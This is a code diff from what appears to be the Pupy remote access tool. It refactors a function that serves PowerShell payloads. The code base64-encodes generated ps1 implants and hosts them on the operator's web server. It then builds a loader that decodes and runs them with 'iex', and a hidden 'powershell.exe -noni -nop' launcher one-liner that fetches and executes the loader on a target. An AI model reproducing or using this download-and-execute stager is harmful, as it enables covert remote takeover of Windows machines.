@@ -11,24 +11,27 @@ import errno
 
 CONNECTION_RETRY_SLEEP_TIME = 3
 
-def serve_ps1_payload(display, server, conf, link_ip="<your_ip>", useTargetProxy=False, nothidden=False):
+def serve_ps1_payload(display, server, conf, link_ip=None, useTargetProxy=False, nothidden=False):
     if not server:
         display(Error('Oneliners only supported from pupysh'))
         return
 
-    if not server.pupweb:
+    if not server.web_handlers_enabled:
         display(Error('Webserver disabled'))
         return
+
+    if link_ip is None:
+        link_ip = server.address
 
     stage_encoding = "$data='{0}';$code=[System.Text.Encoding]::UTF8.GetString("\
       "[System.Convert]::FromBase64String($data));$data='';iex $code;"
 
-    payload_url_x86 = server.pupweb.serve_content(
+    payload_url_x86 = server.serve_content(
         stage_encoding.format(
             b64encode(pupygen.generate_ps1(display, conf, x86=True, as_str=True))),
         as_file=True, alias='ps1 payload [x86]')
 
-    payload_url_x64 = server.pupweb.serve_content(
+    payload_url_x64 = server.serve_content(
         stage_encoding.format(
             b64encode(pupygen.generate_ps1(display, conf, x64=True, as_str=True))),
         as_file=True, alias='ps1 payload [x64]')
@@ -58,7 +61,7 @@ def serve_ps1_payload(display, server, conf, link_ip="<your_ip>", useTargetProxy
         '[SSL_CERT_VALIDATION]': ssl_cert_validation,
         '[PROTOCOL]': protocol,
         '[LINK_IP]': '%s' % link_ip,
-        '[LINK_PORT]': '%s' % server.pupweb.port,
+        '[LINK_PORT]': '%s' % server.web_handler_port,
     }
 
     for k,v in repls.iteritems():
@@ -75,7 +78,7 @@ def serve_ps1_payload(display, server, conf, link_ip="<your_ip>", useTargetProxy
       "[System.Convert]::FromBase64String('{0}'));iex $code;".format(
           b64encode(ps_template_stage1.format(launcher_x64, launcher_x86)))
 
-    landing_uri = server.pupweb.serve_content(stage1, alias='ps1 payload loader')
+    landing_uri = server.serve_content(stage1, alias='ps1 payload loader')
 
     launcher            = powershell.replace('[RANDOM]', landing_uri)
     basic_launcher      = "powershell.exe [HIDDEN]-noni -nop [CMD]".replace('[HIDDEN]', hidden)
